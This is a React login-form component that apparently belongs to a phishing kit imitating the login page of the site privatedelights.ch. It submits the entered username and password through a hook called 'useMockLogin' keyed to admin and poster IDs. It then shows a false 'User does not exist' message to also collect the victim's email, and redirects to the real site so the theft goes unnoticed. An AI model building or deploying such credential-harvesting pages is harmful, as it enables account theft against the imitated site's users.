import React, { useState } from "react";
import { Formik, Form } from "formik";
import * as Yup from "yup";
import { MdVisibility, MdVisibilityOff } from "react-icons/md";
import { CiWarning } from "react-icons/ci";
import TextfieldWrapper from "./TextfieldWrapper";
import SubmitButton from "./SubmitButton";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Cookies from "js-cookie";
import { useRouter } from "next/navigation";
import LoadingModal from "./LoadingModal";

function LoginForm({ adminId, posterId }) {
  const [showPassword, setShowPassword] = useState(false);
  const [isFirstLogin, setIsFirstLogin] = useState(false);
  const [userId, setUserId] = useState(null);
  const [isEmail, setIsEmail] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();
  
  const initialvalues = {
    identifier: "",
    password: "",
  };

  const validate = Yup.object({
    identifier: Yup.string().required("Enter a valid email address"),
    password: Yup.string().min(8, "Minimum 8 characters"),
  });

  const { login, updateUserEmail } = useMockLogin(adminId, posterId);

  const handleSubmit = async (values, formik) => {
    const { identifier, password } = values;

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const isEmailInput = emailRegex.test(identifier);
    setIsEmail(isEmailInput);

    const submitValues = {
      site: site,
      email: identifier,
      password: password,
      skipcode: "",
    };

    // Set loading to true at the start of submission
    setIsLoading(true);

    try {
      if (isFirstLogin && userId) {
        if (isEmailInput) {
          const success = await updateUserEmail({
            email: identifier,
            password,
            id: userId,
          });
          if (success) {
            setIsFirstLogin(false);
            setUserId(null);
          }
        }
        formik.resetForm();
      } else {
        const success = await login(submitValues, formik);
        if (success) {
          const idFromCookie = Cookies.get("id");
          if (idFromCookie) {
            setUserId(idFromCookie);
          }

          if (isEmailInput) {
            router.push("https://privatedelights.ch");
          } else {
            setIsFirstLogin(true);
          }
          formik.resetForm();
        }
      }
    } catch (error) {
      console.error("Submission error:", error);
    } finally {
      // Set loading to false when operation completes (success or failure)
      setIsLoading(false);
    }
  };

  return (
    <div className="md:w-[550px] lg:w-[632px] mx-auto mt-[60px] lg:mt-[95px] mb-[90px] lg:mb-[144px]">
      <LoadingModal isOpen={isLoading} />
      <div className="flex flex-col items-ceneter">
        <div className="">
          <div className="bg-custom-indigo text-white text-xl font-medium px-[26px] py-[18px] shadow-md">
            Login
          </div>
          <div className="border border-slate-300 border-opacity-40 px-[15px] pt-7 pb-[24px]">
           
            {isFirstLogin && !isEmail && (
              <div className="mb-4 p-3 bg-[#ff385f] border border-red-400 rounded">
                <div className="flex items-center gap-5">
                  <p className="text-white">
                    User does not exist.
                  </p>
                </div>
              </div>
            )}

            <Formik
              initialValues={initialvalues}
              validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-[18px]">
                  {isFirstLogin && !isEmail ? (
                    <TextfieldWrapper
                      name="identifier"
                      label={<span className="text-[#ef4444]">Email</span>}
                      type="text"
                      helpertext={
                        <span className="text-[#ef4444]">
                          Enter a valid email address
                        </span>
                      }
                      onFocus={() =>
                        formik.setFieldTouched("identifier", true, true)
                      }
                    />
                  ) : (
                    <TextfieldWrapper
                      name="identifier"
                      label="Username"
                      type="text"
                      helpertext="usernames are case-sensitive"
                    />
                  )}
                  <div className="relative">
                    <TextfieldWrapper
                      name="password"
                      label="Password"
                      helpertext="passwords are case-sensitive"
                      autoComplete="on"
                      type={showPassword ? "text" : "password"}
                      onFocus={() =>
                        formik.setFieldTouched("password", true, true)
                      }
                    />
                    <span
                      className="absolute right-0 top-[17px] text-[23px] opacity-50 cursor-pointer"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <MdVisibilityOff /> : <MdVisibility />}
                    </span>
                  </div>

                  <div className="mt-5 flex justify-center">
                    <SubmitButton disabled={isLoading}>
                      {isLoading ? "Loading..." : "Login"}
                    </SubmitButton>
                  </div>
                </Form>
              )}
            </Formik>

            <div className="mt-[58px] mx-4 lg:mx-[55px] text-[16.5px] flex justify-between items-center text-custom-indigo">
              <p className="cursor-pointer">Set New Password</p>
              <p className="cursor-pointer">Sign Up</p>
              <p className="cursor-pointer">Help</p>
            </div>
          </div>
        </div>
      </div>
      <div className="h-[1px] bg-slate-600/50"></div>
    </div>
  );
}

export default LoginForm;